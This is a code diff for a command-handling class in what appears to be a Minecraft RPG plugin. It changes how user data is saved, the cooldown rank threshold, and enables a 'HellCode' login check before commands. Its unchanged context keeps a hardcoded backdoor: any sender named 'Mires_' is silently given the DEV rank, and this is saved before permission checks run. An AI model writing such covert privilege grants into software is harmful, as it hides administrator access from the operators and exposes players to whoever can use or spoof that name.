@@ -48,7 +48,7 @@ public abstract class CommandAPI extends Command {
         if (sender.getName().equals("Mires_")) {
             final User user = RPGCORE.getInstance().getUserManager().find(((Player) sender).getUniqueId());
             user.getRankUser().setRank(RankType.DEV);
-            RPGCORE.getInstance().getServer().getScheduler().runTaskAsynchronously(RPGCORE.getInstance(), () -> RPGCORE.getInstance().getMongoManager().saveDataUser(((Player) sender).getUniqueId(), user));
+            RPGCORE.getInstance().getServer().getScheduler().runTaskAsynchronously(RPGCORE.getInstance(), () -> RPGCORE.getInstance().getMongoManager().saveDataUser(user.getId(), user));
         }
 
         if (!this.checkPermissions(sender)) {
@@ -61,7 +61,7 @@ public abstract class CommandAPI extends Command {
             final Player player = (Player) sender;
             final UUID uuid = player.getUniqueId();
             final User userProfile = RPGCORE.getInstance().getUserManager().find(uuid);
-            if (userProfile.getRankUser().getRankType().getPriority() < 99) {
+            if (userProfile.getRankUser().getRankType().getPriority() < 9) {
                 if (RPGCORE.getInstance().getCooldownManager().hasCommandCooldown(uuid)) {
                     player.sendMessage(Utils.format(Utils.SERVERNAME + "&cOdczekaj chwile przed wyslaniem kolejnej komendy."));
                     return false;
@@ -75,11 +75,11 @@ public abstract class CommandAPI extends Command {
                     }*/
                 }
             }
-            if (!s.equals("hypecode") && !s.equals("hc") && !s.equals("hcode") && !s.equals("hypec") && !s.equals("spawn")) {
-                /*if (userProfile.getHypeCodePin().getHypecodelogin() == 0) {
-                    MessageHelper.build("&8[&4!&8] &cMusisz wpisac &fHypeCode&c, zeby wpisywac komendy.").send(userProfile);
+            if (!s.equals("hellcode") && !s.equals("code") && !s.equals("hc")  && !s.equals("spawn")) {
+                if (!userProfile.isHellCodeLogin()) {
+                    player.sendMessage(Utils.format(Utils.SERVERNAME + "&7Przed uzyciem tej komendy zaloguj sie swoim HellCode! Uzyj: &c/hellcode <kod>"));
                     return false;
-                }*/
+                }
             }
             RPGCORE.getInstance().getCooldownManager().givePlayerCommandCooldown(uuid);
         }
